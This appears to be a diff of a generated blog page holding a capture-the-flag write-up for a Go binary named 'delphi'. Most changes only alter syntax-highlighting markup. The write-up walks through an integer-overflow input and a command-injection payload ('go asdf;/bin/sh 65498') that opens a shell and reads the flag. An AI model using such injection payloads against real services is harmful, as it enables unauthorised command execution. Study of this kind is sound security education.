@@ -48,6 +48,8 @@
         
           
         
+          
+        
 
         <a href="/feed.xml" class="page-link">RSS</a>
       </div>
@@ -88,7 +90,7 @@ delphi: ELF 64-bit LSB executable, x86-64, version 1 <span class="o">(</span>SYS
 
 <p>Running objdump -t delphi, we can see some symbols of the binary and from these we can conclude it is a compiled Golang program:</p>
 
-<figure class="highlight"><pre><code class="language-bash" data-lang="bash">➜  yvr  objdump -t delphi | grep go
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">➜  yvr  objdump <span class="nt">-t</span> delphi | <span class="nb">grep </span>go
 0000000000506920 l    d  .gopclntab	0000000000000000              .gopclntab
 0000000000754ff0 l    d  .got	0000000000000000              .got
 0000000000755000 l    d  .got.plt	0000000000000000              .got.plt
@@ -112,7 +114,7 @@ Welcome!
 
 Are you ready to play 20 questions? No? Perfect!
 Im thinking of something big, metal, and orange. Go!
-&gt;</code></pre></figure>
+<span class="o">&gt;</span></code></pre></figure>
 
 <p>OK, so we have a place to input data… let’s first look for a place we can latch onto:</p>
 
@@ -188,15 +190,15 @@ Welcome!
 
 Are you ready to play 20 questions? No? Perfect!
 Im thinking of something big, metal, and orange. Go!
-<span class="gp">&gt; </span>go
+<span class="o">&gt;</span> go
 Sneaky, sneaky. Go where? How fast?
-<span class="gp">&gt; </span>something <span class="k">else
+<span class="o">&gt;</span> something <span class="k">else
 </span>Whos that?
-<span class="gp">&gt; </span>asdfasdf
+<span class="o">&gt;</span> asdfasdf
 Whos that?
-<span class="gp">&gt; </span>asdfasdfasd
+<span class="o">&gt;</span> asdfasdfasd
 Maybe? Hmmm.
-<span class="gp">&gt; </span></code></pre></figure>
+<span class="o">&gt;</span> </code></pre></figure>
 
 <p>So “go” is definetly what we want for the first part of our payload.</p>
 
@@ -332,13 +334,13 @@ Welcome!
 
 Are you ready to play 20 questions? No? Perfect!
 Im thinking of something big, metal, and orange. Go!
-<span class="gp">&gt; </span>go asdf 65494    <span class="c"># 2^16 - 42 + 0 == 65494 means eax = 0</span>
-<span class="gp">&gt; </span>go asdf 65495    <span class="c"># 2^16 - 42 + 1 == 65494 means eax = 1</span>
-<span class="gp">&gt; </span>go asdf 65496    <span class="c"># 2^16 - 42 + 2 == 65494 means eax = 2</span>
-<span class="gp">&gt; </span>go asdf 65497    <span class="c"># 2^16 - 42 + 3 == 65494 means eax = 3</span>
-<span class="gp">&gt; </span>go asdf 65498    <span class="c"># 2^16 - 42 + 4 == 65494 means eax = 4</span>
+<span class="o">&gt;</span> go asdf 65494    <span class="c"># 2^16 - 42 + 0 == 65494 means eax = 0</span>
+<span class="o">&gt;</span> go asdf 65495    <span class="c"># 2^16 - 42 + 1 == 65494 means eax = 1</span>
+<span class="o">&gt;</span> go asdf 65496    <span class="c"># 2^16 - 42 + 2 == 65494 means eax = 2</span>
+<span class="o">&gt;</span> go asdf 65497    <span class="c"># 2^16 - 42 + 3 == 65494 means eax = 3</span>
+<span class="o">&gt;</span> go asdf 65498    <span class="c"># 2^16 - 42 + 4 == 65494 means eax = 4</span>
 asdf
-<span class="gp">&gt; </span></code></pre></figure>
+<span class="o">&gt;</span> </code></pre></figure>
 
 <p>Boom! So we got that system call to be executed and all it does right now is “echo <our string="">". But if you look at the code again, it simply concatinates the 2nd part of our payload to the echo without checking for special characters, meaning we can just put a semicolon and execute arbituary commands :D</our></p>
 
@@ -347,11 +349,11 @@ Welcome!
 
 Are you ready to play 20 questions? No? Perfect!
 Im thinking of something big, metal, and orange. Go!
-<span class="gp">&gt; </span>go asdf;/bin/sh 65498
+<span class="o">&gt;</span> go asdf<span class="p">;</span>/bin/sh 65498
 asdf
-<span class="gp">$ </span>cat flag.txt
+<span class="nv">$ </span><span class="nb">cat </span>flag.txt
 flag<span class="o">{</span>something or other<span class="o">}</span>  <span class="c"># Not the actual flag, running locally</span>
-<span class="gp">$ </span></code></pre></figure>
+<span class="nv">$ </span></code></pre></figure>
 
 <p>Not too bad of a challenge, really was more reversing than actually exploitation. So when it all boils down, you have to reverse a basic command protocol, exploit an integer overflow and use metacharacter injection. For 200 points I would say that is reasonable :D</p>
 
